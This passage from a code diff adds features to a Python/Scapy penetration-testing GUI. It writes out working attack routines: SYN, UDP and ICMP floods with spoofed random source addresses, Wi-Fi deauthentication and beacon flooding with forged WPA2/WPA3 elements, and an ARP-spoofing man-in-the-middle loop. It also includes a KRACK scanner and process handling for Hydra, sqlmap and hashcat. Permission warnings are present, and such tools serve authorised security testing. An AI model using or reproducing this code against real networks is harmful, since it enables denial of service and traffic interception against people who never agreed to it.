+                    send_func = sendp if pkt.haslayer(Ether) else send
+                else:
+                    # On-the-fly packet creation for templates
+                    src_ip = _get_random_ip() if params["random_source"] else "1.2.3.4" # Dummy IP if not random
+                    target_ip = params["target_ip"]
+                    target_port = params["target_port"]
+
+                    if template == "TCP SYN Flood":
+                        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
+                    elif template == "UDP Flood":
+                        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / Raw(load=b"X"*1024)
+                    elif template == "ICMP Echo Flood":
+                        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / ICMP()
+
+                if pkt:
+                    send_func(pkt, iface=iface, verbose=0)
+
+                time.sleep(interval)
+
+        except Exception as e:
+            logging.error("Exception in flood thread", exc_info=True)
+            q.put(('error', "Flood Error", str(e)))
+        finally:
+            q.put(('flood_thread_finished', total_threads))
+            logging.info("A flood thread finished.")
+
+    def start_krack_scan(self):
+        iface = self.get_selected_iface()
+        if not iface:
+            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode interface.")
+            return
+
+        self.krack_start_btn.setEnabled(False)
+        self.krack_stop_btn.setEnabled(True)
+        self.krack_results_tree.clear()
+
+        self.krack_thread = KrackScanThread(iface, self)
+        self.krack_thread.vulnerability_detected.connect(self.add_krack_result)
+        self.krack_thread.start()
+
+    def stop_krack_scan(self):
+        if self.krack_thread and self.krack_thread.isRunning():
+            self.krack_thread.stop()
+            self.krack_thread.wait()
+        self.krack_start_btn.setEnabled(True)
+        self.krack_stop_btn.setEnabled(False)
+
+    def add_krack_result(self, bssid, client_mac):
+        # Avoid adding duplicates
+        for i in range(self.krack_results_tree.topLevelItemCount()):
+            item = self.krack_results_tree.topLevelItem(i)
+            if item.text(0) == bssid and item.text(1) == client_mac:
+                return # Already exists
+
+        timestamp = time.strftime('%H:%M:%S')
+        item = QTreeWidgetItem([bssid, client_mac, timestamp])
+        self.krack_results_tree.addTopLevelItem(item)
+
+    def start_firewall_test(self):
+        """Starts the firewall testing worker thread."""
+        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
+        t=self.fw_target.text(); ps_name=self.fw_probe_set.currentText()
+        if not t: QMessageBox.critical(self, "Error", "Please enter a target."); return
+        self.fw_test_button.setEnabled(False); self.is_tool_running=True
+        self.worker = WorkerThread(_firewall_test_thread, args=(self, t,ps_name)); self.worker.start()
+
+    def _firewall_test_thread(self,t,ps_name):
+        q=self.tool_results_queue; iface=self.get_selected_iface()
+        logging.info(f"Firewall test thread started for target {t}, probe set {ps_name}")
+        try:
+            q.put(('fw_clear',)); q.put(('fw_status',f"Testing {ps_name}..."))
+            probe_set = FIREWALL_PROBES[ps_name]
+            for i, (pkt_builder, desc) in enumerate(probe_set):
+                q.put(('fw_status',f"Sending probe {i+1}/{len(probe_set)}: {desc}"))
+
+                pkt = pkt_builder(t)
+                pkt_summary = ""
+
+                if isinstance(pkt, list): # It's a fragmented packet
+                    pkt_summary = f"{len(pkt)} fragments"
+                    ans, unans = sr(pkt, timeout=2, iface=iface, verbose=0)
+                    resp = ans[0][1] if ans else None # Take the first response as representative
+                else: # It's a single packet
+                    pkt_summary = pkt.summary()
+                    resp = sr1(pkt, timeout=2, iface=iface, verbose=0)
+
+                result = "Responded" if resp is not None else "No Response / Blocked"
+                q.put(('fw_result',(desc, pkt_summary, result)))
+            q.put(('fw_status',"Firewall Test Complete."))
+        except Exception as e: logging.error("Exception in firewall test thread",exc_info=True); q.put(('error',"Firewall Test Error",str(e)))
+        finally: q.put(('tool_finished','fw_tester')); logging.info("Firewall test thread finished.")
+
+    def start_wifi_scan(self):
+        """Starts the Wi-Fi scanner and channel hopper threads."""
+        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
+
+        iface = self.get_selected_iface()
+        if not iface:
+            QMessageBox.warning(self, "Warning", "Please select a wireless interface for scanning.")
+            return
+
+        self.wifi_scan_button.setEnabled(False)
+        self.wifi_scan_stop_button.setEnabled(True)
+        self.is_tool_running = True
+        self.found_networks = {}
+        self.wifi_tree.clear()
+
+        self.sniffer_thread = SnifferThread(iface=iface, handler=self._wifi_scan_handler, bpf_filter="type mgt subtype beacon or type mgt subtype probe-resp")
+        self.sniffer_thread.start()
+        self.channel_hopper = ChannelHopperThread(iface)
+        self.channel_hopper.start()
+
+        self.tool_results_queue.put(('wifi_scan_status', 'Scanning... Press Stop to finish.'))
+
+        # We can still have a timeout as a safeguard, but the user can now stop it.
+        self.scan_timer = QTimer(self)
+        self.scan_timer.setSingleShot(True)
+        self.scan_timer.timeout.connect(self.stop_wifi_scan)
+        self.scan_timer.start(30000) # 30 second safeguard timer
+
+    def _wifi_scan_handler(self, pkt):
+        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+            bssid = pkt[Dot11].addr2
+            if bssid not in self.found_networks:
+                try: ssid = pkt[Dot11Elt].info.decode(errors="ignore")
+                except: ssid = "<Hidden>"
+                if not ssid: ssid = "<Hidden>"
+
+                channel = "N/A"
+                try:
+                    elt = pkt.getlayer(Dot11Elt, ID=3)
+                    if elt: channel = ord(elt.info)
+                except: pass
+                signal = "N/A"
+                try: signal = pkt[RadioTap].dbm_antsignal
+                except: pass
+                self.found_networks[bssid] = (ssid, bssid, channel, signal)
+                self.tool_results_queue.put(('wifi_scan_update', self.found_networks[bssid]))
+
+    def stop_wifi_scan(self):
+        if hasattr(self, 'scan_timer') and self.scan_timer.isActive():
+            self.scan_timer.stop()
+
+        if self.sniffer_thread and self.sniffer_thread.isRunning():
+            self.sniffer_thread.stop()
+            self.sniffer_thread.wait()
+        if self.channel_hopper and self.channel_hopper.isRunning():
+            self.channel_hopper.stop()
+            self.channel_hopper.wait()
+
+        self.tool_results_queue.put(('wifi_scan_status', 'Scan Finished.'))
+        self.tool_results_queue.put(('tool_finished', 'wifi_scan'))
+
+    def start_deauth(self):
+        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
+        bssid = self.deauth_bssid.text(); client = self.deauth_client.text()
+        try: count = int(self.deauth_count.text())
+        except ValueError: QMessageBox.critical(self, "Error", "Count must be an integer."); return
+        warning_msg="This will send deauthentication packets which can disrupt a network. Are you sure you want to continue?"
+        if QMessageBox.question(self, "Confirm Deauth", warning_msg) == QMessageBox.StandardButton.No: return
+        self.deauth_button.setEnabled(False); self.is_tool_running = True
+        args = (bssid, client, count)
+        self.worker = WorkerThread(_deauth_thread, args=(self, *args)); self.worker.start()
+
+    def _deauth_thread(self, bssid, client, count):
+        q = self.tool_results_queue; iface = self.get_selected_iface()
+        logging.info(f"Deauth thread started: BSSID={bssid}, Client={client}, Count={count}")
+        try:
+            pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+            q.put(('deauth_status', f"Sending {count} deauth packets..."))
+            sendp(pkt, iface=iface, count=count, inter=0.1, verbose=0)
+            q.put(('deauth_status', "Deauth packets sent."))
+        except Exception as e: logging.error("Exception in deauth thread", exc_info=True); q.put(('error',"Deauth Error",str(e)))
+        finally: q.put(('tool_finished','deauth')); logging.info("Deauth thread finished.")
+
+    def start_beacon_flood(self):
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        iface = self.get_selected_iface()
+        if not iface:
+            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode interface.")
+            return
+
+        bssid = self.bf_bssid_edit.text()
+        enc_type = self.bf_enc_combo.currentText()
+
+        # Handle SSIDs
+        ssids = []
+        if self.bf_ssid_edit.isReadOnly(): # Loaded from file
+            ssids = self.bf_ssid_list
+        else:
+            ssids = [self.bf_ssid_edit.text().strip()]
+
+        if not ssids or not ssids[0]:
+            QMessageBox.critical(self, "Input Error", "Please provide at least one SSID.")
+            return
+
+        try:
+            count = int(self.bf_count_edit.text())
+            interval = float(self.bf_interval_edit.text())
+            channel = int(self.bf_channel_edit.text())
+            if not (1 <= channel <= 14):
+                raise ValueError("Channel must be between 1 and 14.")
+        except ValueError as e:
+            QMessageBox.critical(self, "Input Error", f"Invalid input for Count, Interval, or Channel: {e}")
+            return
+
+        self.is_tool_running = True
+        self.bf_start_button.setEnabled(False)
+        self.bf_stop_button.setEnabled(True)
+        self.tool_stop_event.clear()
+
+        args = (iface, ssids, bssid, count, interval, enc_type, channel)
+        self.worker = WorkerThread(_beacon_flood_thread, args=(self, *args))
+        self.worker.start()
+
+    def _build_beacon_frame(self, ssid, bssid, channel, enc_type):
+        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)
+
+        cap = 'ESS'
+        if enc_type != "Open":
+            cap += '+privacy'
+
+        beacon = Dot11Beacon(cap=cap)
+        essid = Dot11Elt(ID='SSID', info=ssid)
+        ds_param = Dot11Elt(ID='DSset', info=chr(channel))
+
+        frame = RadioTap() / dot11 / beacon / essid / ds_param
+
+        if enc_type == "WEP":
+            # WEP is signaled by the privacy bit in the capability field alone.
+            pass
+        elif enc_type == "WPA2-PSK":
+            rsn_info = Dot11Elt(ID='RSNinfo', info=(
+                b'\x01\x00'      # RSN Version 1
+                b'\x00\x0f\xac\x04'  # Group Cipher Suite: AES (CCMP)
+                b'\x01\x00'      # 1 Pairwise Cipher Suite
+                b'\x00\x0f\xac\x04'  # AES (CCMP)
+                b'\x01\x00'      # 1 Authentication Key Management Suite (AKM)
+                b'\x00\x0f\xac\x02'  # PSK
+                b'\x00\x00'      # RSN Capabilities
+            ))
+            frame /= rsn_info
+        elif enc_type == "WPA3-SAE":
+            rsn_info = Dot11Elt(ID='RSNinfo', info=(
+                b'\x01\x00'      # RSN Version 1
+                b'\x00\x0f\xac\x04'  # Group Cipher Suite: AES (CCMP)
+                b'\x01\x00'      # 1 Pairwise Cipher Suite
+                b'\x00\x0f\xac\x04'  # AES (CCMP)
+                b'\x01\x00'      # 1 Authentication Key Management Suite (AKM)
+                b'\x00\x0f\xac\x08'  # SAE
+                b'\x8c\x00'      # RSN Capabilities (MFPC, MFPR)
+            ))
+            frame /= rsn_info
+
+        return frame
+
+    def _beacon_flood_thread(self, iface, ssids, bssid, count, interval, enc_type, channel):
+        q = self.tool_results_queue
+        logging.info(f"Beacon flood started: SSIDs={len(ssids)}, BSSID={bssid}, Count={count}, Enc={enc_type}")
+
+        sent_count = 0
+        ssid_index = 0
+        infinite_mode = (count == 0)
+
+        try:
+            while not self.tool_stop_event.is_set():
+                if not infinite_mode and sent_count >= count:
+                    break
+
+                current_bssid = RandMAC() if bssid.lower() == 'random' else bssid
+                current_ssid = ssids[ssid_index]
+
+                beacon_frame = self._build_beacon_frame(current_ssid, current_bssid, channel, enc_type)
+
+                sendp(beacon_frame, iface=iface, verbose=0)
+                sent_count += 1
+                ssid_index = (ssid_index + 1) % len(ssids) # Cycle through SSIDs
+
+                status_msg = f"Flooding {current_ssid}... (Packets sent: {sent_count})"
+                if not infinite_mode:
+                    status_msg += f" / {count}"
+                q.put(('bf_status', status_msg))
+
+                time.sleep(interval)
+
+            if self.tool_stop_event.is_set():
+                q.put(('bf_status', "Beacon flood canceled."))
+            else:
+                q.put(('bf_status', "Beacon flood complete."))
+
+        except Exception as e:
+            logging.error("Exception in beacon flood thread", exc_info=True)
+            q.put(('error', "Beacon Flood Error", str(e)))
+        finally:
+            q.put(('tool_finished', 'beacon_flood'))
+            logging.info("Beacon flood thread finished.")
+
+    def _arp_spoof_thread(self, victim_ip, target_ip):
+        q = self.tool_results_queue
+        iface = self.get_selected_iface()
+        logging.info(f"ARP spoof thread started for Victim={victim_ip}, Target={target_ip}")
+
+        try:
+            q.put(('arp_spoof_status', "Resolving MAC addresses..."))
+            victim_mac = getmacbyip(victim_ip)
+            target_mac = getmacbyip(target_ip)
+
+            if not victim_mac or not target_mac:
+                raise Exception("Could not resolve MAC address for one or both targets. Are they online?")
+
+            q.put(('arp_spoof_status', f"Victim: {victim_mac} | Target: {target_mac}"))
+            logging.info(f"Resolved MACs -> Victim: {victim_mac}, Target: {target_mac}")
+
+            victim_packet = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
+            target_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip)
+
+            sent_count = 0
+            while not self.tool_stop_event.is_set():
+                sendp(victim_packet, iface=iface, verbose=0)
+                sendp(target_packet, iface=iface, verbose=0)
+                sent_count += 2
+                q.put(('arp_spoof_status', f"Spoofing active... (Packets sent: {sent_count})"))
+                time.sleep(2)
+
+        except Exception as e:
+            logging.error("Exception in ARP spoof thread", exc_info=True)
+            q.put(('error', "ARP Spoof Error", str(e)))
+        finally:
+            q.put(('tool_finished', 'arp_spoof'))
+            logging.info("ARP spoof thread finished.")
+
+    def start_arp_spoof(self):
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        victim_ip = self.arp_spoof_victim_ip.text()
+        target_ip = self.arp_spoof_target_ip.text()
+
+        if not victim_ip or not target_ip:
+            QMessageBox.critical(self, "Error", "Victim IP and Target IP are required.")
+            return
+
+        warning_msg = """
+        <p>You are about to perform an ARP Spoofing attack. This will intercept traffic between the two targets and constitutes a Man-in-the-Middle attack.</p>
+        <p>Ensure you have <b>explicit, written permission</b> to test on this network. Misuse of this tool is illegal.</p>
+        <p><b>Do you accept full responsibility and wish to continue?</b></p>
+        """
+        if QMessageBox.question(self, "Ethical Use Confirmation", warning_msg, QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.No:
+            return
+
+        self.arp_spoof_current_victim = victim_ip
+        self.arp_spoof_current_target = target_ip
+
+        self.is_tool_running = True
+        self.arp_spoof_start_btn.setEnabled(False)
+        self.arp_spoof_stop_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+
+        args = (victim_ip, target_ip)
+        self.worker = WorkerThread(_arp_spoof_thread, args=(self, *args))
+        self.worker.start()
+
+    def stop_arp_spoof(self):
+        if self.is_tool_running:
+            logging.info("User requested to stop ARP spoofing.")
+            self.arp_spoof_status.setText("Stopping...")
+            self.tool_stop_event.set()
+
+    def _restore_arp(self, victim_ip, target_ip):
+        iface = self.get_selected_iface()
+        logging.info(f"Attempting to restore ARP tables for {victim_ip} and {target_ip}")
+        try:
+            victim_mac = getmacbyip(victim_ip)
+            target_mac = getmacbyip(target_ip)
+
+            if not victim_mac or not target_mac:
+                raise Exception("Could not resolve MACs for restoration. Manual correction may be needed.")
+
+            # Create the legitimate ARP packets
+            restore_victim_packet = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac)
+            restore_target_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac)
+
+            # Send them multiple times to ensure the cache is corrected
+            sendp([restore_victim_packet, restore_target_packet], count=5, inter=0.2, iface=iface, verbose=0)
+
+            logging.info("ARP restoration packets sent.")
+            self.arp_spoof_status.setText("ARP tables restored. Attack stopped.")
+
+        except Exception as e:
+            logging.error(f"Failed to restore ARP tables: {e}", exc_info=True)
+            QMessageBox.critical(self, "Restore Error", f"Could not restore ARP tables: {e}")
+
+    def cancel_tool(self):
+        if self.is_tool_running:
+            logging.info("User requested to cancel the current tool.")
+            self.tool_stop_event.set()
+
+            # Special handling for subprocesses that need to be terminated directly
+            # This is more robust than only relying on the thread's check loop.
+            with self.thread_finish_lock:
+                if hasattr(self, 'nmap_process') and self.nmap_process and self.nmap_process.poll() is None:
+                    try:
+                        self.nmap_process.terminate()
+                        logging.info("Nmap process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Nmap process: {e}")
+
+                if hasattr(self, 'arp_scan_cli_process') and self.arp_scan_cli_process and self.arp_scan_cli_process.poll() is None:
+                    try:
+                        self.arp_scan_cli_process.terminate()
+                        logging.info("arp-scan process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating arp-scan process: {e}")
+                if hasattr(self, 'spiderfoot_process') and self.spiderfoot_process and self.spiderfoot_process.poll() is None:
+                    try:
+                        self.spiderfoot_process.terminate()
+                        logging.info("Spiderfoot process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Spiderfoot process: {e}")
+                if hasattr(self, 'sherlock_process') and self.sherlock_process and self.sherlock_process.poll() is None:
+                    try:
+                        self.sherlock_process.terminate()
+                        logging.info("Sherlock process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Sherlock process: {e}")
+                if hasattr(self, 'fierce_process') and self.fierce_process and self.fierce_process.poll() is None:
+                    try:
+                        self.fierce_process.terminate()
+                        logging.info("fierce process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating fierce process: {e}")
+                if hasattr(self, 'dnsrecon_process') and self.dnsrecon_process and self.dnsrecon_process.poll() is None:
+                    try:
+                        self.dnsrecon_process.terminate()
+                        logging.info("dnsrecon process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating dnsrecon process: {e}")
+                if hasattr(self, 'enum4linux_ng_process') and self.enum4linux_ng_process and self.enum4linux_ng_process.poll() is None:
+                    try:
+                        self.enum4linux_ng_process.terminate()
+                        logging.info("enum4linux-ng process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating enum4linux-ng process: {e}")
+                if hasattr(self, 'hydra_process') and self.hydra_process and self.hydra_process.poll() is None:
+                    try:
+                        self.hydra_process.terminate()
+                        logging.info("Hydra process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Hydra process: {e}")
+                if hasattr(self, 'jtr_process') and self.jtr_process and self.jtr_process.poll() is None:
+                    try:
+                        self.jtr_process.terminate()
+                        logging.info("JTR process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating JTR process: {e}")
+                if hasattr(self, 'ffuf_process') and self.ffuf_process and self.ffuf_process.poll() is None:
+                    try:
+                        self.ffuf_process.terminate()
+                        logging.info("ffuf process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating ffuf process: {e}")
+                if hasattr(self, 'dirsearch_process') and self.dirsearch_process and self.dirsearch_process.poll() is None:
+                    try:
+                        self.dirsearch_process.terminate()
+                        logging.info("dirsearch process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating dirsearch process: {e}")
+                if hasattr(self, 'rustscan_process') and self.rustscan_process and self.rustscan_process.poll() is None:
+                    try:
+                        self.rustscan_process.terminate()
+                        logging.info("RustScan process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating RustScan process: {e}")
+                if hasattr(self, 'trufflehog_process') and self.trufflehog_process and self.trufflehog_process.poll() is None:
+                    try:
+                        self.trufflehog_process.terminate()
+                        logging.info("TruffleHog process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating TruffleHog process: {e}")
+                if hasattr(self, 'httpx_process') and self.httpx_process and self.httpx_process.poll() is None:
+                    try:
+                        self.httpx_process.terminate()
+                        logging.info("httpx process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating httpx process: {e}")
+                if hasattr(self, 'subfinder_process') and self.subfinder_process and self.subfinder_process.poll() is None:
+                    try:
+                        self.subfinder_process.terminate()
+                        logging.info("Subfinder process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Subfinder process: {e}")
+
+                if hasattr(self, 'sublist3r_process') and self.sublist3r_process and self.sublist3r_process.poll() is None:
+                    try:
+                        self.sublist3r_process.terminate()
+                        logging.info("Sublist3r process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Sublist3r process: {e}")
+
+                if hasattr(self, 'wifite_process') and self.wifite_process and self.wifite_process.poll() is None:
+                    try:
+                        os.kill(self.wifite_process.pid, signal.SIGTERM)
+                        logging.info("Wifite process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating wifite process: {e}")
+
+                if hasattr(self, 'nikto_process') and self.nikto_process and self.nikto_process.poll() is None:
+                    try:
+                        self.nikto_process.terminate()
+                        logging.info("Nikto process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Nikto process: {e}")
+
+                if hasattr(self, 'gobuster_process') and self.gobuster_process and self.gobuster_process.poll() is None:
+                    try:
+                        self.gobuster_process.terminate()
+                        logging.info("Gobuster process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Gobuster process: {e}")
+
+                if hasattr(self, 'sqlmap_process') and self.sqlmap_process and self.sqlmap_process.poll() is None:
+                    try:
+                        self.sqlmap_process.terminate()
+                        logging.info("SQLMap process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating SQLMap process: {e}")
+
+                if hasattr(self, 'whatweb_process') and self.whatweb_process and self.whatweb_process.poll() is None:
+                    try:
+                        self.whatweb_process.terminate()
+                        logging.info("WhatWeb process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating WhatWeb process: {e}")
+
+                if hasattr(self, 'hashcat_process') and self.hashcat_process and self.hashcat_process.poll() is None:
+                    try:
+                        self.hashcat_process.terminate()
+                        logging.info("Hashcat process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Hashcat process: {e}")
+
+                if hasattr(self, 'nuclei_process') and self.nuclei_process and self.nuclei_process.poll() is None:
+                    try:
+                        self.nuclei_process.terminate()
+                        logging.info("Nuclei process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Nuclei process: {e}")
+                if hasattr(self, 'masscan_process') and self.masscan_process and self.masscan_process.poll() is None:
+                    try:
+                        self.masscan_process.terminate()
+                        logging.info("Masscan process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Masscan process: {e}")
+
+                if hasattr(self, 'masscan_process') and self.masscan_process and self.masscan_process.poll() is None:
+                    try:
+                        self.masscan_process.terminate()
+                        logging.info("Masscan process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Masscan process: {e}")
+
+                if hasattr(self, 'masscan_process') and self.masscan_process and self.masscan_process.poll() is None:
+                    try:
+                        self.masscan_process.terminate()
+                        logging.info("Masscan process terminated directly by cancel_tool.")
+                    except Exception as e:
+                        logging.error(f"Error terminating Masscan process: {e}")
+
+    def _show_port_scan_summary_popup(self, results, target):
+        dialog = QDialog(self)
+        dialog.setWindowTitle(f"Port Scan Results for {target}")
+        dialog.setMinimumSize(400, 300)
+        layout = QVBoxLayout(dialog)
+
+        categorized = {"Open": [], "Open | Filtered": [], "Closed": [], "Filtered": [], "Unfiltered (RST)": [], "No Response / Filtered": []}
+        for port, state, service in results:
+            # Normalize states
+            normalized_state = state
+            if "No Response" in state:
+                normalized_state = "No Response / Filtered"
+
+            if normalized_state in categorized:
+                categorized[normalized_state].append(f"{port} ({service})")
+            else: # Fallback for any unexpected state
+                if "Other" not in categorized: categorized["Other"] = []
+                categorized["Other"].append(f"{port} ({state}, {service})")
+
+
+        text_browser = QTextBrowser()
+        text_browser.setOpenExternalLinks(False)
+        html = f"<h1>Scan Report: {target}</h1>"
+        # Display open ports first
+        if categorized["Open"]:
+            html += f"<h2>Open Ports ({len(categorized['Open'])})</h2>"
+            html += "<ul>" + "".join(f"<li>{p}</li>" for p in sorted(categorized['Open'])) + "</ul>"
+
+        for state, ports in categorized.items():
+            if state != "Open" and ports:
+                html += f"<h2>{state} ({len(ports)})</h2>"
+                html += "<ul>" + "".join(f"<li>{p}</li>" for p in sorted(ports)) + "</ul>"
+
+        text_browser.setHtml(html)
+        layout.addWidget(text_browser)
+
+        button_layout = QHBoxLayout()
+
+        analyze_button = QPushButton("Send to AI Analyst")
+        analyze_button.clicked.connect(lambda: self._send_to_ai_analyst("port_scanner", results, context=target))
+        button_layout.addWidget(analyze_button)
+
+        ok_button = QPushButton("OK")
+        ok_button.clicked.connect(dialog.accept)
+        button_layout.addWidget(ok_button)
+        layout.addLayout(button_layout)
+
+        dialog.exec()
+
+    def _show_arp_scan_summary_popup(self, results, target):
+        dialog = QDialog(self)
+        dialog.setWindowTitle(f"ARP Scan Results for {target}")
+        dialog.setMinimumSize(500, 400)
+        layout = QVBoxLayout(dialog)
+
+        summary_label = QLabel(f"<b>Found {len(results)} active hosts on network {target}.</b>")
+        layout.addWidget(summary_label)
+
+        tree = QTreeWidget()
+        tree.setColumnCount(3)
+        tree.setHeaderLabels(["IP Address", "MAC Address", "Vendor"])
+        for res in results:
+            item = QTreeWidgetItem([res['ip'], res['mac'], res['vendor']])
+            tree.addTopLevelItem(item)
+        tree.resizeColumnToContents(0)
+        tree.resizeColumnToContents(1)
+        layout.addWidget(tree)
+
+        export_button = self._create_export_button(tree) # Reuse export functionality
+        layout.addWidget(export_button)
+
+        ok_button = QPushButton("OK")
+        ok_button.clicked.connect(dialog.accept)
+        layout.addWidget(ok_button)
+
+        dialog.exec()
+
+    def _process_tool_results(self):
+        """Processes results from worker threads via a queue using a handler dictionary."""
+        while not self.tool_results_queue.empty():
+            msg = self.tool_results_queue.get()
+            msg_type = msg[0]
+
+            # Prioritize exact matches
+            if msg_type in self.result_handlers:
+                # Unpack arguments; msg[1:] creates a tuple of the remaining elements
+                self.result_handlers[msg_type](*msg[1:])
+                continue
+
+            # Check for suffix-based dynamic handlers
+            matched = False
+            for suffix, handler in self.dynamic_handlers.items():
+                if msg_type.endswith(suffix):
+                    tool_name = msg_type.rsplit(suffix, 1)[0]
+                    handler(tool_name, *msg[1:])
+                    matched = True
+                    break
+
+            if not matched:
+                logging.warning(f"No handler found for message type: {msg_type}")
+
+    def _setup_result_handlers(self):
+        """Initializes the dictionary mapping result queue messages to handler functions."""
+        self.result_handlers = {
+            # Exact message matches
+            'send_results': self._handle_send_results,
+            'send_finished': self._handle_send_finished,
+            'tool_finished': self._handle_tool_finished,
+            'report_finished': self._handle_report_finished,
+            'flood_thread_finished': self._handle_flood_thread_finished,
+            'ps_worker_finished': self._handle_ps_worker_finished,
+            'crunch_finished': self._handle_crunch_finished,
+            'show_port_scan_popup': self._show_port_scan_summary_popup,
+            'show_arp_scan_popup': self._show_arp_scan_summary_popup,
+            'arp_results': self._handle_arp_results,
+            'error': self._handle_error,
+        }
+        # Handlers for dynamic message types that end with a specific suffix
+        self.dynamic_handlers = {
+            'lab_status': self._handle_lab_status,
+            'cve_search_status': self._handle_cve_search_status,
+            'cve_result': self._handle_cve_result,
+            'exploit_search_status': self._handle_exploit_search_status,
+            'exploit_search_results': self._handle_exploit_search_results,
+            '_status': self._handle_status_update,
+            '_clear': self._handle_clear_update,
+            '_result': self._handle_result_update,
+            '_update': self._handle_result_update, # Catches 'wifi_scan_update'
+        }
+        self.result_handlers['nmap_output'] = self._handle_nmap_output
+        self.result_handlers['nmap_xml_result'] = self._handle_nmap_xml_result
+        self.result_handlers['sublist3r_output'] = self._handle_sublist3r_output
+        self.result_handlers['sublist3r_results'] = self._show_subdomain_results_popup
+        self.result_handlers['subfinder_output'] = self._handle_subfinder_output
+        self.result_handlers['subdomain_results'] = self._show_subdomain_results_popup
+        self.result_handlers['httpx_output'] = self._handle_httpx_output
+        self.result_handlers['httpx_results'] = self._show_httpx_results_popup
+        self.result_handlers['trufflehog_output'] = self._handle_trufflehog_output
+        self.result_handlers['trufflehog_results'] = self._show_trufflehog_results_popup
+        self.result_handlers['rustscan_output'] = self._handle_rustscan_output
+        self.result_handlers['dirsearch_output'] = self._handle_dirsearch_output
+        self.result_handlers['dirsearch_results'] = self._show_dirsearch_results_popup
+        self.result_handlers['ffuf_output'] = self._handle_ffuf_output
+        self.result_handlers['ffuf_results'] = self._show_ffuf_results_popup
+        self.result_handlers['jtr_output'] = self._handle_jtr_output
+        self.result_handlers['hydra_output'] = self._handle_hydra_output
+        self.result_handlers['enum4linux_ng_output'] = self._handle_enum4linux_ng_output
+        self.result_handlers['enum4linux_ng_results'] = self._show_enum4linux_ng_results_popup
+        self.result_handlers['dnsrecon_output'] = self._handle_dnsrecon_output
+        self.result_handlers['dnsrecon_results'] = self._show_dnsrecon_results_popup
+        self.result_handlers['sherlock_output'] = self._handle_sherlock_output
+        self.result_handlers['sherlock_results'] = self._show_sherlock_results_popup
+        self.result_handlers['spiderfoot_output'] = self._handle_spiderfoot_output
+        self.result_handlers['arp_scan_cli_output'] = self._handle_arp_scan_cli_output
+        self.result_handlers['fierce_output'] = self._handle_fierce_output
+        self.result_handlers['wifite_output'] = self._handle_wifite_output
+        self.result_handlers['nikto_output'] = self._handle_nikto_output
+        self.result_handlers['gobuster_output'] = self._handle_gobuster_output
+        self.result_handlers['sqlmap_output'] = self._handle_sqlmap_output
+        self.result_handlers['whatweb_output'] = self._handle_whatweb_output
+        self.result_handlers['hashcat_output'] = self._handle_hashcat_output
+        self.result_handlers['nuclei_output'] = self._handle_nuclei_output
+        self.result_handlers['nuclei_results'] = self._show_nuclei_results_popup
+        self.result_handlers['masscan_output'] = self._handle_masscan_output
+        self.result_handlers['report_finding'] = self._handle_report_finding
+
+    def _handle_report_finished(self, success, message):
+        """Handles the result of the report generation thread."""
+        self.report_generate_btn.setEnabled(True)
+        if success:
+            QMessageBox.information(self, "Report Generated", f"Report successfully saved to:\n{message}")
